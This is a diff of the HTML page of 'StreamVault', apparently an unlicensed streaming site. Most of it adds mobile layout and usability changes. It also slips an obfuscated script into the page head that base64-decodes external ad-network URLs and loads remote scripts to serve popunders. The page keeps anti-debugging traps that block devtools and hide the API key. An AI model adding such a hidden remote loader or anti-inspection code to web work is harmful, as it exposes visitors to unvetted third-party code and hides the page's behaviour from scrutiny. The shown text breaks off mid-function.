@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>StreamVault</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <script type="text/javascript" data-cfasync="false"> /*<![CDATA[/* */ (function(){var y=window,l="b0dcbf2a6a273bf7c7343ad3cf020346",m=[["siteId",193+203+995*416+4791574],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],o=["d3d3LmludGVsbGlnZW5jZWFkeC5jb20vbS9waGFuZGxlYmFycy5taW4uanM=","ZDJrbHg4N2Jnem5nY2UuY2xvdWRmcm9udC5uZXQvR3dSY3QvbEsvdXBhdGgubWluLmNzcw=="],b=-1,s,c,w=function(){clearTimeout(c);b++;if(o[b]&&!(1775029829000<(new Date).getTime()&&1<b)){s=y.document.createElement("script");s.type="text/javascript";s.async=!0;var d=y.document.getElementsByTagName("script")[0];s.src="https://"+atob(o[b]);s.crossOrigin="anonymous";s.onerror=w;s.onload=function(){clearTimeout(c);y[l.slice(0,16)+l.slice(0,16)]||w()};c=setTimeout(w,5E3);d.parentNode.insertBefore(s,d)}};if(!y[l]){try{Object.freeze(y[l]=m)}catch(e){}w()}})(); /*]]>/* */ </script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap');
     
@@ -32,6 +33,13 @@
       color: var(--text-primary);
       min-height: 100vh;
       overflow-x: hidden;
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      -khtml-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
     }
 
     /* Animated background */
@@ -95,6 +103,8 @@
       font-weight: 500;
       transition: all 0.3s ease;
       position: relative;
+      padding: 0.5rem;
+      border-radius: 8px;
     }
 
     .nav-links a::after {
@@ -110,10 +120,21 @@
 
     .nav-links a:hover {
       color: var(--text-primary);
+      background: rgba(255, 255, 255, 0.1);
     }
 
     .nav-links a:hover::after {
       width: 100%;
+    }
+
+    .mobile-menu-toggle {
+      display: none;
+      background: none;
+      border: none;
+      color: var(--text-primary);
+      font-size: 1.5rem;
+      cursor: pointer;
+      padding: 0.5rem;
     }
 
     .search-bar {
@@ -181,6 +202,8 @@
       display: flex;
       align-items: center;
       gap: 0.5rem;
+      min-height: 44px;
+      touch-action: manipulation;
     }
 
     .category-btn:hover {
@@ -214,6 +237,8 @@
       font-family: inherit;
       font-size: 0.9rem;
       font-weight: 500;
+      min-height: 40px;
+      touch-action: manipulation;
     }
 
     .genre-btn:hover {
@@ -275,6 +300,7 @@
     .banner-buttons {
       display: flex;
       gap: 1rem;
+      flex-wrap: wrap;
     }
 
     .btn {
@@ -290,6 +316,8 @@
       align-items: center;
       gap: 0.5rem;
       font-family: inherit;
+      min-height: 48px;
+      touch-action: manipulation;
     }
 
     .btn-primary {
@@ -335,6 +363,7 @@
       gap: 1.5rem;
       padding: 1rem 0;
       scroll-behavior: smooth;
+      -webkit-overflow-scrolling: touch;
     }
 
     .content-row::-webkit-scrollbar {
@@ -358,6 +387,7 @@
       position: relative;
       border-radius: 15px;
       overflow: hidden;
+      touch-action: manipulation;
     }
 
     .content-card img {
@@ -389,7 +419,7 @@
       border-radius: 15px;
     }
 
-    .content-card:hover::after {
+        .content-card:hover::after {
       opacity: 1;
     }
 
@@ -406,6 +436,7 @@
       align-items: center;
       z-index: 1000;
       animation: fadeIn 0.3s ease;
+      padding: 1rem;
     }
 
     @keyframes fadeIn {
@@ -419,7 +450,7 @@
       border: 1px solid var(--glass-border);
       border-radius: 20px;
       padding: 2rem;
-      width: 90%;
+      width: 100%;
       max-width: 900px;
       max-height: 90vh;
       overflow-y: auto;
@@ -484,13 +515,15 @@
 
     .server-selector select {
       width: 100%;
-      padding: 0.8rem;      border-radius: 10px;
+      padding: 0.8rem;
+      border-radius: 10px;
       border: 1px solid var(--glass-border);
       background: var(--glass-bg);
       backdrop-filter: blur(10px);
       color: var(--text-primary);
       font-family: inherit;
       font-size: 1rem;
+      min-height: 48px;
     }
 
     .modal-video {
@@ -508,6 +541,12 @@
       color: var(--accent-color);
       cursor: pointer;
       transition: all 0.3s ease;
+      padding: 0.5rem;
+      min-width: 44px;
+      min-height: 44px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
     .close:hover {
@@ -526,13 +565,14 @@
       display: none;
       justify-content: center;
       align-items: flex-start;
-      padding-top: 5rem;
+      padding: 2rem 1rem;
       z-index: 1500;
     }
 
     .search-modal-content {
-      width: 90%;
+      width: 100%;
       max-width: 800px;
+      margin-top: 2rem;
     }
 
     .search-modal input {
@@ -546,6 +586,7 @@
       font-size: 1.2rem;
       margin-bottom: 2rem;
       font-family: inherit;
+      min-height: 48px;
     }
 
     .search-results {
@@ -553,8 +594,9 @@
       grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
       gap: 1.5rem;
       padding: 1rem 0;
-      max-height: 400px;
+      max-height: 60vh;
       overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
     }
 
     .search-results img {
@@ -564,6 +606,7 @@
       border-radius: 10px;
       cursor: pointer;
       transition: all 0.3s ease;
+      touch-action: manipulation;
     }
 
     .search-results img:hover {
@@ -599,10 +642,16 @@
       text-decoration: none;
       transition: all 0.3s ease;
       font-weight: 500;
+      padding: 0.5rem;
+      border-radius: 8px;
+      min-height: 44px;
+      display: flex;
+      align-items: center;
     }
 
     .footer-links a:hover {
       color: var(--accent-color);
+      background: rgba(255, 255, 255, 0.1);
     }
 
     /* Warning overlay styles */
@@ -622,6 +671,7 @@
       text-align: center;
       font-size: 2rem;
       font-weight: bold;
+      padding: 2rem;
     }
 
     /* Loading spinner */
@@ -650,22 +700,59 @@
     @media (max-width: 768px) {
       .navbar {
         padding: 1rem;
-        flex-direction: column;
-        gap: 1rem;
+        position: relative;
+      }
+
+      .mobile-menu-toggle {
+        display: block;
       }
 
       .nav-links {
+        position: absolute;
+        top: 100%;
+        left: 0;
+        right: 0;
+        background: rgba(12, 12, 12, 0.95);
+        backdrop-filter: blur(20px);
+        border-top: 1px solid var(--glass-border);
         flex-direction: column;
-        gap: 1rem;
+        gap: 0;
+        padding: 1rem;
+        transform: translateY(-100%);
+        opacity: 0;
+        visibility: hidden;
+        transition: all 0.3s ease;
+        z-index: 1000;
+      }
+
+      .nav-links.active {
+        transform: translateY(0);
+        opacity: 1;
+        visibility: visible;
+      }
+
+      .nav-links a {
         width: 100%;
+        padding: 1rem;
+        text-align: center;
+        border-bottom: 1px solid var(--glass-border);
+      }
+
+      .nav-links a:last-child {
+        border-bottom: none;
       }
 
       .search-bar {
         width: 100%;
+        margin-top: 1rem;
       }
 
       .category-filter {
         padding: 1rem;
+      }
+
+      .category-title {
+        font-size: 1.3rem;
       }
 
       .category-buttons {
@@ -675,6 +762,9 @@
       .category-btn {
         padding: 0.5rem 1rem;
         font-size: 0.9rem;
+        flex: 1;
+        min-width: calc(50% - 0.25rem);
+        justify-content: center;
       }
 
       .genre-filter {
@@ -684,6 +774,9 @@
       .genre-btn {
         padding: 0.3rem 0.8rem;
         font-size: 0.8rem;
+        flex: 1;
+        min-width: calc(33.333% - 0.33rem);
+        text-align: center;
       }
 
       .banner {
@@ -695,15 +788,38 @@
         font-size: 2.5rem;
       }
 
+      .banner-description {
+        font-size: 1rem;
+      }
+
+      .banner-buttons {
+        gap: 0.5rem;
+      }
+
+      .btn {
+        padding: 0.7rem 1.5rem;
+        font-size: 0.9rem;
+        flex: 1;
+        justify-content: center;
+      }
+
+      .modal {
+        padding: 0.5rem;
+        align-items: flex-start;
+        padding-top: 2rem;
+      }
+
       .modal-content {
         padding: 1.5rem;
-        width: 95%;
+        width: 100%;
+        max-height: 95vh;
       }
 
       .modal-header {
         flex-direction: column;
         align-items: center;
         text-align: center;
+        gap: 1rem;
       }
 
       .modal-poster {
@@ -711,7 +827,48 @@
       }
 
       .modal-title {
-        font-size: 2rem;
+        font-size: 1.8rem;
+      }
+
+      .modal-rating {
+        font-size: 1.2rem;
+      }
+
+      .modal-description {
+        font-size: 1rem;
+      }
+
+      .modal-video {
+        height: 250px;
+      }
+
+      .close {
+        top: 0.5rem;
+        right: 1rem;
+        font-size: 1.5rem;
+      }
+
+      .search-modal {
+        padding: 1rem;
+      }
+
+      .search-modal-content {
+        margin-top: 1rem;
+      }
+
+      .search-modal input {
+        font-size: 1rem;
+        padding: 0.8rem 1rem;
+      }
+
+      .search-results {
+        grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+        gap: 1rem;
+        max-height: 50vh;
+      }
+
+      .search-results img {
+        height: 180px;
       }
 
       .content-card {
@@ -725,15 +882,69 @@
       .section {
         margin: 2rem 1rem;
       }
+
+      .section h2 {
+        font-size: 1.5rem;
+      }
+
+      .footer {
+        padding: 2rem 1rem;
+      }
+
+      .footer-links {
+        gap: 1rem;
+      }
+
+      .footer-links a {
+        font-size: 0.9rem;
+      }
+
+      .warning-overlay {
+        font-size: 1.5rem;
+        padding: 1rem;
+      }
     }
 
     @media (max-width: 480px) {
+      .navbar {
+        padding: 0.8rem;
+      }
+
+      .logo {
+        font-size: 1.5rem;
+      }
+
+      .category-btn {
+        font-size: 0.8rem;
+        padding: 0.4rem 0.8rem;
+        min-width: 100%;
+      }
+
+      .genre-btn {
+        font-size: 0.7rem;
+        padding: 0.25rem 0.6rem;
+        min-width: calc(50% - 0.25rem);
+      }
+
       .banner h1 {
         font-size: 2rem;
       }
 
+      .banner-description {
+        font-size: 0.9rem;
+      }
+
+      .btn {
+        padding: 0.6rem 1rem;
+        font-size: 0.8rem;
+      }
+
       .modal-title {
         font-size: 1.5rem;
+      }
+
+      .modal-video {
+        height: 200px;
       }
 
       .content-card {
@@ -742,6 +953,87 @@
 
       .content-card img {
         height: 180px;
+      }
+
+      .search-results {
+        grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+      }
+
+      .search-results img {
+        height: 150px;
+      }
+
+      .warning-overlay {
+        font-size: 1.2rem;
+      }
+    }
+
+    /* Touch-specific improvements */
+    @media (hover: none) and (pointer: coarse) {
+      .content-card:hover {
+        transform: none;
+      }
+
+      .content-card:active {
+        transform: scale(0.95);
+      }
+
+      .btn:hover {
+        transform: none;
+      }
+
+      .btn:active {
+        transform: scale(0.95);
+      }
+
+      .category-btn:hover,
+      .genre-btn:hover {
+        transform: none;
+      }
+
+      .category-btn:active,
+      .genre-btn:active {
+        transform: scale(0.95);
+      }
+    }
+
+    /* Landscape orientation on mobile */
+    @media (max-width: 768px) and (orientation: landscape) {
+      .banner {
+        height: 80vh;
+      }
+
+      .modal-video {
+        height: 300px;
+      }
+    }
+
+    /* Very small screens */
+    @media (max-width: 320px) {
+      .category-btn,
+      .genre-btn {
+        font-size: 0.7rem;
+        padding: 0.3rem 0.5rem;
+      }
+
+      .banner h1 {
+                font-size: 1.8rem;
+      }
+
+      .modal-content {
+        padding: 1rem;
+      }
+
+      .modal-poster {
+        width: 120px;
+      }
+
+      .content-card {
+        min-width: 100px;
+      }
+
+      .content-card img {
+        height: 150px;
       }
     }
   </style>
@@ -759,11 +1051,14 @@
 
   <nav class="navbar">
     <a href="#" class="logo">StreamVault</a>
-    <div class="nav-links">
-      <a href="#" onclick="showAllContent()">Home</a>
-      <a href="#" onclick="filterByType('movie')">Movies</a>
-      <a href="#" onclick="filterByType('tv')">TV Shows</a>
-      <a href="#" onclick="filterByType('anime')">Anime</a>
+    <button class="mobile-menu-toggle" onclick="toggleMobileMenu()">
+      <i class="fas fa-bars"></i>
+    </button>
+    <div class="nav-links" id="nav-links">
+      <a href="#" onclick="showAllContent(); closeMobileMenu()">Home</a>
+      <a href="#" onclick="filterByType('movie'); closeMobileMenu()">Movies</a>
+      <a href="#" onclick="filterByType('tv'); closeMobileMenu()">TV Shows</a>
+      <a href="#" onclick="filterByType('anime'); closeMobileMenu()">Anime</a>
       <input type="text" class="search-bar" placeholder="Search movies, shows, anime..." onfocus="openSearchModal()" />
     </div>
   </nav>
@@ -815,7 +1110,7 @@
         <button class="btn btn-primary" onclick="showBannerDetails()">
           <i class="fas fa-play"></i> Watch Now
         </button>
-        <button class="btn btn-secondary">
+        <button class="btn btn-secondary" onclick="showBannerDetails()">
           <i class="fas fa-info-circle"></i> More Info
         </button>
       </div>
@@ -852,11 +1147,11 @@
       <div class="server-selector">
         <label for="server"><i class="fas fa-server"></i> Select Server:</label>
         <select id="server" onchange="changeServer()">
-          <option value="vidsrc.cc">Vidsrc.cc</option>
-          <option value="vidsrc.me">Vidsrc.me</option>
-          <option value="player.videasy.net">Player.Videasy.net</option>
-          <option value="111movies.com">111movies.com</option>
-          <option value="moviesapi.to">moviesapi.to</option>
+          <option value="111movies.com">Server 1</option>
+          <option value="vidsrc.me">Server 2</option>
+          <option value="player.videasy.net">Server 3</option>
+          <option value="vidsrc.cc">Server 4</option>
+          <option value="moviesapi.to">Server 5</option>
         </select>
       </div>
       <iframe id="modal-video" class="modal-video" allowfullscreen></iframe>
@@ -884,65 +1179,92 @@
   </footer>
 
   <script>
-    // Anti-debugging protection
+    // Anti-debugging protection (modified for mobile)
     (function() {
       'use strict';
       
-      // Disable right-click context menu
+      // Disable right-click context menu (but allow on mobile)
       document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        return false;
-      });
-
-      // Disable common keyboard shortcuts for dev tools
-      document.addEventListener('keydown', function(e) {
-        // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+Shift+C
-        if (e.keyCode === 123 || 
-            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
-            (e.ctrlKey && e.keyCode === 85) ||
-            (e.ctrlKey && e.shiftKey && e.keyCode === 67)) {
+        if (!isMobile()) {
           e.preventDefault();
-          showWarning();
           return false;
         }
       });
 
-      // DevTools detection using timing
+      // Function to detect mobile devices
+      function isMobile() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
+               ('ontouchstart' in window) || 
+               (navigator.maxTouchPoints > 0);
+      }
+
+      // Disable common keyboard shortcuts for dev tools (desktop only)
+      document.addEventListener('keydown', function(e) {
+        if (!isMobile()) {
+          // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+Shift+C
+          if (e.keyCode === 123 || 
+              (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
+              (e.ctrlKey && e.keyCode === 85) ||
+              (e.ctrlKey && e.shiftKey && e.keyCode === 67)) {
+            e.preventDefault();
+            showWarning();
+            return false;
+          }
+        }
+      });
+
+      // DevTools detection using timing (desktop only)
       let devtools = {open: false, orientation: null};
       const threshold = 160;
       
-      setInterval(function() {
-        if (window.outerHeight - window.innerHeight > threshold || 
-            window.outerWidth - window.innerWidth > threshold) {
-          if (!devtools.open) {
-            devtools.open = true;
-            showWarning();
+      if (!isMobile()) {
+        setInterval(function() {
+          if (window.outerHeight - window.innerHeight > threshold || 
+              window.outerWidth - window.innerWidth > threshold) {
+            if (!devtools.open) {
+              devtools.open = true;
+              showWarning();
+            }
+          } else {
+            if (devtools.open) {
+              devtools.open = false;
+              hideWarning();
+            }
           }
-        } else {
-          if (devtools.open) {
-            devtools.open = false;
-            hideWarning();
-          }
-        }
-      }, 500);
+        }, 500);
+      }
 
       // Console warning message
       console.log('%cSTOP!', 'color: red; font-size: 50px; font-weight: bold;');
-      console.log('%cThis is a browser feature intended for developers. Unauthorized access to this console may violate the terms of service.', 'color: red; font-size: 16px;');      // Detect console usage
-      let consoleCheck = () => {
-        let start = new Date();
-        debugger;
-        let end = new Date();
-        if (end - start > 100) {
-          showWarning();
-        }
-      };
+      console.log('%cThis is a browser feature intended for developers. Unauthorized access to this console may violate the terms of service.', 'color: red; font-size: 16px;');
 
-      // Clear console periodically
-      setInterval(() => {
-        console.clear();
-        consoleCheck();
-      }, 2000);
+      // Detect console usage (desktop only)
+      if (!isMobile()) {
+        let consoleCheck = () => {
+          let start = new Date();
+          debugger;
+          let end = new Date();
+          if (end - start > 100) {
+            showWarning();
+          }
+        };
+
+        // Clear console periodically
+        setInterval(() => {
+          console.clear();
+          consoleCheck();
+        }, 2000);
+
+        // Anti-debugging using performance timing
+        setInterval(function() {
+          const start = performance.now();
+          debugger;
+          const end = performance.now();
+          if (end - start > 100) {
+            showWarning();
+          }
+        }, 1000);
+      }
 
       // Disable text selection on important elements
       document.addEventListener('selectstart', function(e) {
@@ -958,16 +1280,6 @@
         return false;
       });
 
-      // Anti-debugging using performance timing
-      setInterval(function() {
-        const start = performance.now();
-        debugger;
-        const end = performance.now();
-        if (end - start > 100) {
-          showWarning();
-        }
-      }, 1000);
-
       function showWarning() {
         document.getElementById('warning-overlay').style.display = 'flex';
         document.body.style.filter = 'blur(10px)';
@@ -982,6 +1294,41 @@
       window[atob('c2hvd1dhcm5pbmc=')] = showWarning;
       window[atob('aGlkZVdhcm5pbmc=')] = hideWarning;
     })();
+
+    // Mobile menu functionality
+    function toggleMobileMenu() {
+      const navLinks = document.getElementById('nav-links');
+      const toggle = document.querySelector('.mobile-menu-toggle i');
+      
+      navLinks.classList.toggle('active');
+      
+      if (navLinks.classList.contains('active')) {
+        toggle.classList.remove('fa-bars');
+        toggle.classList.add('fa-times');
+      } else {
+        toggle.classList.remove('fa-times');
+        toggle.classList.add('fa-bars');
+      }
+    }
+
+    function closeMobileMenu() {
+      const navLinks = document.getElementById('nav-links');
+      const toggle = document.querySelector('.mobile-menu-toggle i');
+      
+      navLinks.classList.remove('active');
+      toggle.classList.remove('fa-times');
+      toggle.classList.add('fa-bars');
+    }
+
+    // Close mobile menu when clicking outside
+    document.addEventListener('click', function(e) {
+      const navbar = document.querySelector('.navbar');
+      const navLinks = document.getElementById('nav-links');
+      
+      if (!navbar.contains(e.target) && navLinks.classList.contains('active')) {
+        closeMobileMenu();
+      }
+    });
 
     // Main application code (encoded/obfuscated sensitive parts)
     const API_KEY = atob('NDU2MDM5ZWVhNTk2OTFlY2Y4ZGIzMzkyYWZjZWFiZTA=');
@@ -1044,7 +1391,7 @@
       
       banner.style.backgroundImage = `url(${IMG_URL}${item.backdrop_path})`;
       title.textContent = item.title || item.name;
-      description.textContent = item.overview || 'Discover amazing content on StreamVault';
+            description.textContent = item.overview || 'Discover amazing content on StreamVault';
     }
 
     function showBannerDetails() {
@@ -1075,6 +1422,16 @@
         
         card.appendChild(img);
         card.onclick = () => showDetails(item);
+        
+        // Add touch feedback for mobile
+        card.addEventListener('touchstart', function() {
+          this.style.transform = 'scale(0.95)';
+        });
+        
+        card.addEventListener('touchend', function() {
+          this.style.transform = '';
+        });
+        
         container.appendChild(card);
       });
     }
@@ -1090,6 +1447,9 @@
       
       changeServer();
       document.getElementById('modal').style.display = 'flex';
+      
+      // Prevent body scroll when modal is open
+      document.body.style.overflow = 'hidden';
     }
 
     function changeServer() {
@@ -1105,7 +1465,7 @@
         embedURL = `${atob('aHR0cHM6Ly9wbGF5ZXIudmlkZWFzeS5uZXQ=')}/${type}/${currentItem.id}`;
       } else if(server === "111movies.com") {
         embedURL = `${atob('aHR0cHM6Ly9wbGF5ZXIudmlkZWFzeS5uZXQ=')}/${type}/${currentItem.id}`;
-      }else if(server === "moviesapi.to") {
+      } else if(server === "moviesapi.to") {
         embedURL = `${atob('aHR0cHM6Ly9wbGF5ZXIudmlkZWFzeS5uZXQ=')}/${type}/${currentItem.id}`;
       }
 
@@ -1115,48 +1475,91 @@
     function closeModal() {
       document.getElementById('modal').style.display = 'none';
       document.getElementById('modal-video').src = '';
+      
+      // Restore body scroll
+      document.body.style.overflow = '';
     }
 
     function openSearchModal() {
       document.getElementById('search-modal').style.display = 'flex';
-      document.getElementById('search-input').focus();
+      
+      // Focus input after a short delay to ensure modal is visible
+      setTimeout(() => {
+        document.getElementById('search-input').focus();
+      }, 100);
+      
+      // Prevent body scroll when modal is open
+      document.body.style.overflow = 'hidden';
+      
+      // Close mobile menu if open
+      closeMobileMenu();
     }
 
     function closeSearchModal() {
       document.getElementById('search-modal').style.display = 'none';
       document.getElementById('search-results').innerHTML = '';
       document.getElementById('search-input').value = '';
+      
+      // Restore body scroll
+      document.body.style.overflow = '';
     }
 
+    let searchTimeout;
     async function searchTMDB() {
       const query = document.getElementById('search-input').value;
+      
+      // Clear previous timeout
+      if (searchTimeout) {
+        clearTimeout(searchTimeout);
+      }
+      
       if (!query.trim()) {
         document.getElementById('search-results').innerHTML = '';
         return;
       }
 
-      try {
-        const res = await fetch(`${BASE_URL}/search/multi?api_key=${API_KEY}&query=${query}`);
-        const data = await res.json();
+      // Debounce search to avoid too many API calls
+      searchTimeout = setTimeout(async () => {
+        try {
+          const res = await fetch(`${BASE_URL}/search/multi?api_key=${API_KEY}&query=${encodeURIComponent(query)}`);
+          const data = await res.json();
 
-        const container = document.getElementById('search-results');
-        container.innerHTML = '';
-        
-        data.results.forEach(item => {
-          if (!item.poster_path) return;
+          const container = document.getElementById('search-results');
+          container.innerHTML = '';
           
-          const img = document.createElement('img');
-          img.src = `${IMG_URL}${item.poster_path}`;
-          img.alt = item.title || item.name;
-          img.onclick = () => {
-            closeSearchModal();
-            showDetails(item);
-          };
-          container.appendChild(img);
-        });
-      } catch (error) {
-        console.error('Error searching:', error);
-      }
+          if (data.results.length === 0) {
+            container.innerHTML = '<p style="text-align: center; color: var(--text-secondary); padding: 2rem;">No results found</p>';
+            return;
+          }
+          
+          data.results.forEach(item => {
+            if (!item.poster_path) return;
+            
+            const img = document.createElement('img');
+            img.src = `${IMG_URL}${item.poster_path}`;
+            img.alt = item.title || item.name;
+            img.loading = 'lazy'; // Lazy load images for better performance
+            img.onclick = () => {
+              closeSearchModal();
+              showDetails(item);
+            };
+            
+            // Add touch feedback for mobile
+            img.addEventListener('touchstart', function() {
+              this.style.transform = 'scale(0.95)';
+            });
+            
+            img.addEventListener('touchend', function() {
+              this.style.transform = '';
+            });
+            
+            container.appendChild(img);
+          });
+        } catch (error) {
+          console.error('Error searching:', error);
+          document.getElementById('search-results').innerHTML = '<p style="text-align: center; color: var(--accent-color); padding: 2rem;">Error searching. Please try again.</p>';
+        }
+      }, 300); // 300ms delay
     }
 
     // Category and Genre Filter Functions
@@ -1290,7 +1693,6 @@
     }
 
     // Close modals when clicking outside
-    document.getElementById('modal').addEventListener    // Close modals when clicking outside
     document.getElementById('modal').addEventListener('click', function(e) {
       if (e.target === this) {
         closeModal();
@@ -1308,6 +1710,7 @@
       if (e.key === 'Escape') {
         closeModal();
         closeSearchModal();
+        closeMobileMenu();
       }
       if (e.key === '/' && !e.ctrlKey && !e.metaKey) {
         e.preventDefault();
@@ -1315,8 +1718,146 @@
       }
     });
 
+    // Touch and swipe gestures for mobile
+    let touchStartX = 0;
+    let touchStartY = 0;
+
+    document.addEventListener('touchstart', function(e) {
+      touchStartX = e.touches[0].clientX;
+      touchStartY = e.touches[0].clientY;
+    });
+
+    document.addEventListener('touchmove', function(e) {
+      if (!touchStartX || !touchStartY) {
+        return;
+      }
+
+      let touchEndX = e.touches[0].clientX;
+      let touchEndY = e.touches[0].clientY;
+
+      let diffX = touchStartX - touchEndX;
+      let diffY = touchStartY - touchEndY;
+
+      // Prevent default scrolling behavior in modals
+      if (document.getElementById('modal').style.display === 'flex' || 
+          document.getElementById('search-modal').style.display === 'flex') {
+        if (Math.abs(diffY) > Math.abs(diffX)) {
+          // Vertical swipe - allow scrolling within modal content
+          return;
+        }
+      }
+    });
+
+    document.addEventListener('touchend', function(e) {
+      touchStartX = 0;
+      touchStartY = 0;
+    });
+
+    // Optimize for mobile performance
+    function optimizeForMobile() {
+      // Add passive event listeners for better scroll performance
+      document.addEventListener('touchstart', function() {}, { passive: true });
+      document.addEventListener('touchmove', function() {}, { passive: true });
+      
+      // Reduce animations on low-end devices
+      if (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) {
+        document.documentElement.style.setProperty('--animation-duration', '0.1s');
+      }
+      
+      // Optimize images for mobile
+      const images = document.querySelectorAll('img');
+      images.forEach(img => {
+        img.loading = 'lazy';
+      });
+    }
+
+        // Initialize mobile optimizations
+    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+      optimizeForMobile();
+    }
+
+    // Intersection Observer for lazy loading and performance
+    const observerOptions = {
+      root: null,
+      rootMargin: '50px',
+      threshold: 0.1
+    };
+
+    const imageObserver = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          const img = entry.target;
+          if (img.dataset.src) {
+            img.src = img.dataset.src;
+            img.removeAttribute('data-src');
+            imageObserver.unobserve(img);
+          }
+        }
+      });
+    }, observerOptions);
+
+    // Debounced resize handler for better performance
+    let resizeTimeout;
+    window.addEventListener('resize', function() {
+      clearTimeout(resizeTimeout);
+      resizeTimeout = setTimeout(function() {
+        // Handle orientation changes on mobile
+        if (window.innerHeight < window.innerWidth) {
+          // Landscape mode
+          document.body.classList.add('landscape');
+        } else {
+          // Portrait mode
+          document.body.classList.remove('landscape');
+        }
+      }, 250);
+    });
+
+    // Service Worker for offline functionality (optional)
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', function() {
+        navigator.serviceWorker.register('/sw.js').then(function(registration) {
+          console.log('ServiceWorker registration successful');
+        }, function(err) {
+          console.log('ServiceWorker registration failed');
+        });
+      });
+    }
+
+    // Error handling for network issues
+    window.addEventListener('online', function() {
+      console.log('Connection restored');
+      // Retry failed requests if any
+    });
+
+    window.addEventListener('offline', function() {
+      console.log('Connection lost');
+      // Show offline message
+    });
+
+    // Preload critical resources
+    function preloadCriticalResources() {
+      const criticalImages = [
+        // Add any critical images that should be preloaded
+      ];
+      
+      criticalImages.forEach(src => {
+        const link = document.createElement('link');
+        link.rel = 'preload';
+        link.as = 'image';
+        link.href = src;
+        document.head.appendChild(link);
+      });
+    }
+
+    // Initialize the app with error handling
     async function init() {
       try {
+        // Show loading state
+        document.getElementById('banner-title').textContent = 'Loading...';
+        document.getElementById('movies-list').innerHTML = '<div class="loading"><div class="spinner"></div></div>';
+        document.getElementById('tvshows-list').innerHTML = '<div class="loading"><div class="spinner"></div></div>';
+        document.getElementById('anime-list').innerHTML = '<div class="loading"><div class="spinner"></div></div>';
+
         const [movies, tvShows, anime] = await Promise.all([
           fetchTrending('movie'),
           fetchTrending('tv'),
@@ -1331,23 +1872,213 @@
         if (movies.length > 0) {
           displayBanner(movies[Math.floor(Math.random() * Math.min(movies.length, 5))]);
           displayList(movies, 'movies-list');
+        } else {
+          document.getElementById('movies-list').innerHTML = '<p style="text-align: center; color: var(--text-secondary); padding: 2rem;">No movies available</p>';
         }
         
         if (tvShows.length > 0) {
           displayList(tvShows, 'tvshows-list');
+        } else {
+          document.getElementById('tvshows-list').innerHTML = '<p style="text-align: center; color: var(--text-secondary); padding: 2rem;">No TV shows available</p>';
         }
         
         if (anime.length > 0) {
           displayList(anime, 'anime-list');
+        } else {
+          document.getElementById('anime-list').innerHTML = '<p style="text-align: center; color: var(--text-secondary); padding: 2rem;">No anime available</p>';
         }
+
+        // Preload critical resources after initial load
+        preloadCriticalResources();
+
       } catch (error) {
         console.error('Error initializing app:', error);
         document.getElementById('banner-title').textContent = 'Welcome to StreamVault';
+        document.getElementById('banner-description').textContent = 'Unable to load content. Please check your connection and try again.';
+        
+        // Show error message in content areas
+        const errorMessage = '<p style="text-align: center; color: var(--accent-color); padding: 2rem;">Unable to load content. Please refresh the page.</p>';
+        document.getElementById('movies-list').innerHTML = errorMessage;
+        document.getElementById('tvshows-list').innerHTML = errorMessage;
+        document.getElementById('anime-list').innerHTML = errorMessage;
       }
     }
 
+    // Add loading states for better UX
+    function showLoadingState(containerId) {
+      document.getElementById(containerId).innerHTML = '<div class="loading"><div class="spinner"></div></div>';
+    }
+
+    // Add retry functionality
+    function addRetryButton(containerId, retryFunction) {
+      const container = document.getElementById(containerId);
+      container.innerHTML = `
+        <div style="text-align: center; padding: 2rem;">
+          <p style="color: var(--text-secondary); margin-bottom: 1rem;">Failed to load content</p>
+          <button class="btn btn-primary" onclick="${retryFunction}">
+            <i class="fas fa-redo"></i> Retry
+          </button>
+        </div>
+      `;
+    }
+
+    // Performance monitoring
+    function measurePerformance() {
+      if ('performance' in window) {
+        window.addEventListener('load', function() {
+          setTimeout(function() {
+            const perfData = performance.getEntriesByType('navigation')[0];
+            console.log('Page load time:', perfData.loadEventEnd - perfData.loadEventStart, 'ms');
+          }, 0);
+        });
+      }
+    }
+
+    // Initialize performance monitoring
+    measurePerformance();
+
+    // Add smooth scrolling for anchor links
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+          target.scrollIntoView({
+            behavior: 'smooth',
+            block: 'start'
+          });
+        }
+      });
+    });
+
+    // Add pull-to-refresh functionality for mobile
+    let startY = 0;
+    let pullDistance = 0;
+    const pullThreshold = 100;
+
+    document.addEventListener('touchstart', function(e) {
+      if (window.scrollY === 0) {
+        startY = e.touches[0].pageY;
+      }
+    }, { passive: true });
+
+    document.addEventListener('touchmove', function(e) {
+      if (startY && window.scrollY === 0) {
+        pullDistance = e.touches[0].pageY - startY;
+        if (pullDistance > 0) {
+          // Add visual feedback for pull-to-refresh
+          document.body.style.transform = `translateY(${Math.min(pullDistance / 3, 50)}px)`;
+        }
+      }
+    }, { passive: true });
+
+    document.addEventListener('touchend', function(e) {
+      if (pullDistance > pullThreshold) {
+        // Trigger refresh
+        location.reload();
+      }
